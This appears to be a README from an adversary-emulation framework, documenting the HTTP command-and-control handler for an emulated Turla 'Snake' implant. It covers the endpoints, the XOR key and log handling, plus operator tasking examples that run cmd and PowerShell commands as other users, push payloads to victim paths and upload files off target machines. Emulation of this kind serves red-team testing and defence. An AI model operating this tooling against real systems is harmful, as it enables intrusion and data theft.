# Snake HTTP handler

The Snake HTTP C2 handler is the server-side counterpart for the Snake implant and is specifically designed to interact with it over HTTP.

## Components
The handler consists of an HTTP web server that listens on a specified address/port and serves the following URL endpoints:
- `GET /PUB/{identifier}`, where `{identifier}` is either a specific resource that the implant is requesting or the identifier for the implant. 
Requesting a resource of `home.html` indicates that the implant is performing a heartbeat check to see if the server is up, in which case the server will respond with `1`. Otherwise, `{identifier}` is treated as the implant ID, and the server will use this value to determine if a new session is established or if an existing implant is checking in for additional tasking.
- `POST /IMAGES/3/{instruction_id}` for submitting command output, implant logs, or a generic file upload for the instruction identified by `{instruction_id}`. The C2 server will determine if the instruction ID is for an assigned file upload - if so, the received data is stored under the same filename on the C2 server. If the instruction ID is not linked to an assigned file upload, the C2 server checks if it's one of the hardcoded log file IDs, in which case it accepts the upload as the associated log file. Otherwise, the C2 server assumes that the upload contains command output for the instruction. In this case, the C2 server will log the received command output if the instruction ID is mapped to an implant ID. On successful upload, the server will respond with `1`. Note that when accepting log fiel uploads, the server will decode and decrypt each log line before writing the destination file on the server-side.
  - Regular C2 logs will be uploaded to `/IMAGES/3/62810421015953103444` and saved under `files/C2Log.YYYY-MM-DD-HH-MM-SS.log`, where the timestamp represents the time the log was received. This prevents multiple log file uploads from overwring previous ones.
  - Execution logs will be uploaded to `/IMAGES/3/23329841273669992682` and saved under `files/ExecutionLog.YYYY-MM-DD-HH-MM-SS.log`
  - Pipe server logs will be uploaded to `/IMAGES/3/59463656487865612747` and saved under `files/PipeServerLog.YYYY-MM-DD-HH-MM-SS.log`
  - Pipe client logs will be uploaded to `/IMAGES/3/16488587954892310865` and saved under `files/PipeClientLog.YYYY-MM-DD-HH-MM-SS.log`
- `GET /IMAGES/3/{instruction_id}` to retrieve the payload associated with the given instruction ID. If no instruction with the ID is found, the C2 server will respond with an internal server error message. Note that the implant must be tasked with a payload download instruction before requesting the payload.

### Encryption
Turla has used XOR encryption for C2 communications with Snake<sup>[1](https://artemonsecurity.com/snake_whitepaper.pdf)</sup>, and we use a different XOR key:
```
1f903053jlfajsklj39019013ut098e77xhlajklqpozufoghi642098cbmdakandqiox536898jiqjpe6092smmkeut02906
```

The C2 handler uses XOR encryption in the following scenarios:
- encrypting beacon responses containing tasking
- encrypting payloads sent to implant
- decrypting command output received from implant
- decrypting log files and other file uploads received from implant

## Usage

### Configuration
To enable and configure the Snake HTTP handler within the control server, edit the `config/handler_config.yml` from the main C2 server repo. 
Adjust the Snake HTTP entry as needed.

Example:
```
snakehttp:
  host: 10.0.2.7
  port: 80
  enabled: true
```

Run the `controlServer` binary as `sudo` and look for success messages in starting up the Snake handler:
```
sudo ./controlServer
```

### Tasking Implants
To register or receive tasking for an implant session, the Snake HTTP handler expects a `GET` request for `/PUB/{identifier}`, where `{identifier}` is the implant ID. If this is the first time that the Snake HTTP handler recognizes the implant with id `{identifier}`, then it will set up a new session within the internal C2 REST server and then begin tasking the implant upon subsequent `GET` requests to the same endpoint.

For example:
```
curl http://192.168.0.4:8080/PUB/abcd # First request, registers a new implant session with ID "abcd". Returns empty task.
curl http://192.168.0.4:8080/PUB/abcd # Second request. Session for "abcd" already exists, returns a task if available, otherwise empty task.
```

As with other C2 handlers, implant tasking is performed by sending requests to the internal REST server using the `evalsC2client.py` script. 
The Snake HTTP handler will allow operators to task the following command types using a JSON dict payload format.

The JSON dict can contain the following fields:
- `type` - command type code that specifies the type of command to send (e.g. execute a process, download a file, upload a file). Must be an integer
- `command` - for type codes dealing with `cmd.exe` or powershell execution, this string represents the command to run. For example, `whoami /all` or `get-childitem .`
- `file` - for the payload download type code (`4`), this represents the filename to request from the C2 server. For the file upload task code (`5`), this represents the file path of the local file to upload.
- `dest` - for the payload download type code (`4`), this represents the destination file path to save the payload.
- `proc` - for the process execution type code (`3`), this represents the binary name/path to execute (e.g. `whoami.exe`)
- `args` - for the process execution type code (`3`), this represents the arguments to execute the process with (e.g. `/all` for `whoami.exe`)
- `runas` - for process or command execution tasks, this represents the user to create the process under (e.g. `mydomain\dummyuser`)

Below are examples of each type code:
- `{"type": 1, "command": "..."}` or `{"type": 1, "command": "...", "runas":"domain\user"}` - the command type code `01` will have the implant execute a `cmd.exe` command with the provided args. Note that a command is required for task type `1`. The implant will send the command output to the C2 server. If a username is provided via the `runas` key, the command process will be created under that user if possible.
- `{"type": 2, "command": "..."}` - the command type code `02` will have the implant execute a `powershell.exe` command with the provided args. Note that a command is required for task type `2`. The command will be encoded to UTF-16LE and then base64 encoded so that the implant can run it via `powershell.exe -nol -noni -nop -enc `. The implant will send output to the C2 server afterwards. If a username is provided via the `runas` key, the command process will be created under that user if possible.
- `{"type": 3, "proc": path_to_binary_to_execute}` or `{"type": 3, "proc": path_to_binary_to_execute, "args": "arg1 arg2 ... argN"}` - the task type code `3` will instruct the implant to execute the binary at the provided path and with the provided args, if any args are provided. The implant will send output to the C2 server afterwards. If a username is provided via the `runas` key, the command process will be created under that user if possible.
- `{"type": 4, "file": "payload_to_download", "dest": "dest_path_on_victim"}` - the task type `4` will have the implant request a file download from the C2 server for `payload_to_download`, and the file will be saved as `dest_path_on_victim`, or the snake home directory if only a file name is specified. To have the file downloaded to the current directory, use the `.\` path prefix (e.g. `.\filename`).
- `{"type": 5, "file": "path_to_file_to_upload"}` - the task type `05` will request the implant to upload a local file from the target machine, specified by `path_to_file_to_upload`
- `{"type": 6}` - the task type `6` will request the implant to upload its logs.

Examples of valid tasking:
```
./evalsC2client.py --set-task <guid> '{"type": 1, "command": "whoami /all", "runas":"testdomain\\testuser"}'
./evalsC2client.py --set-task <guid> '{"type": 1, "command": "ping 1.2.3.4"}'
./evalsC2client.py --set-task <guid> '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Get-ChildItem somedir -Recurse"}'
./evalsC2client.py --set-task <guid> '{"type": 3, "proc": "executable.exe", "args":"arg1 arg2 arg3"}'
./evalsC2client.py --set-task <guid> '{"type": 3, "proc": "C:\\path to my\\executable.exe"}'
./evalsC2client.py --set-task <guid> '{"type": 4, "file": "payload.exe", "dest":"C:\\Users\\Public\\payload.exe"}'
./evalsC2client.py --set-task <guid> '{"type": 4, "file": "payload.exe", "dest":"payload.exe"}'
./evalsC2client.py --set-task <guid> '{"type": 5, "file": "C:\\users\\public\\to_upload.txt"}'
./evalsC2client.py --set-task <guid> '{"type": 6}'
```

Examples of invalid tasking:
```
./evalsC2client.py --set-task <guid> '{"type": 1}' # 01 requires a command
./evalsC2client.py --set-task <guid> '{"type": 2}' # 02 requires a command
./evalsC2client.py --set-task <guid> '{"type": 3}' # 03 requires a command
./evalsC2client.py --set-task <guid> '{"type": 4}' # 04 requires payload information
./evalsC2client.py --set-task <guid> '{"type": 4, "file":"testingfile"}' # 04 requires both payload name and destination path/name
./evalsC2client.py --set-task <guid> '{"type": 5} # 05 requires a filename to upload
./evalsC2client.py --set-task <guid> '{"type": 12, "random":"asdb"}' # unsupported task type code
```

## Decrypting Logs
If you need to decrypt Snake log files and you don't have a responding or live implant, you can transfer the log files from the victim machine to the C2 server machine and use the `decrypt_logs.py` utility in this folder:
```
python3 decrypt_logs.py -p /path/to/log -o /path/to/output/file
```

## CTI References
1. https://artemonsecurity.com/snake_whitepaper.pdf
